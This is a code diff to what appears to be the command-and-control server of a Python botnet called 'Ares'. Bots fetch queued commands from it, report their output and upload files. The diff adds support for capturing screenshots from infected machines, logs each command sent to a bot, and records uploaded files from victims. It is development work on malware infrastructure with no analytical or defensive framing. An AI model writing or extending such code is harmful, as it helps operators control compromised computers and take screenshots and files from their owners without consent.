@@ -92,6 +92,7 @@ class API(object):
         cmd = query_DB("SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date", (botid, 0))
         if cmd:
             exec_DB("UPDATE commands SET sent=? where id=?", (1, cmd[0][0]))
+            exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), "&gt; " + cmd[0][2], html_escape(botid)))
             return cmd[0][2]
         else:
             return ""
@@ -109,6 +110,8 @@ class API(object):
         exec_DB("INSERT INTO commands VALUES (?, ?, ?, ?, ?)", (None, time.time(), html_escape(cmd), False, html_escape(botid)))
         if cmd.startswith("upload "):
             pending_uploads.append(cmd[len("upload "):])
+        if cmd.startswith("screenshot"):
+            pending_uploads.append("screenshot")
 
     @cherrypy.expose
     def stdout(self, botid):
@@ -117,10 +120,10 @@ class API(object):
         output = ""
         bot_output = query_DB('SELECT * FROM output WHERE bot=? ORDER BY date DESC LIMIT 10', (botid,))
         for entry in reversed(bot_output):
-            output += "> %s\n\n" % entry[2]
+            output += "%s\n\n" % entry[2]
         bot_queue = query_DB('SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date', (botid, 0))
         for entry in bot_queue:
-            output += "> %s\n[PENDING...]\n\n" % entry[2]
+            output += "> %s [PENDING...]\n\n" % entry[2]
         return output
 
     @cherrypy.expose
@@ -135,6 +138,8 @@ class API(object):
             expected_file = src.split(".zip")[0]
         if expected_file in pending_uploads:
             pending_uploads.remove(expected_file)
+        elif "screenshot" in pending_uploads:
+            pending_uploads.remove("screenshot")
         else:
             raise cherrypy.HTTPError(403)
         while os.path.exists(os.path.join(up_dir, src)):
@@ -148,7 +153,7 @@ class API(object):
             outfile.write(data)
         outfile.close()
         up_url = "../uploads/" +  html_escape(botid) + "/" + html_escape(src)
-        return 'Uploaded: <a href="' + up_url + '">' + up_url + '</a>'
+        exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), 'Uploaded: <a href="' + up_url + '">' + up_url + '</a>', html_escape(botid)))
 
 
 def main():
@@ -157,7 +162,7 @@ def main():
                 'environment': 'production',
                 },
                 '/': {  
-                    'response.headers.server' : "Ares",
+                    'response.headers.server': "Ares",
                 },
                 '/static': {
                     'tools.staticdir.on': True,
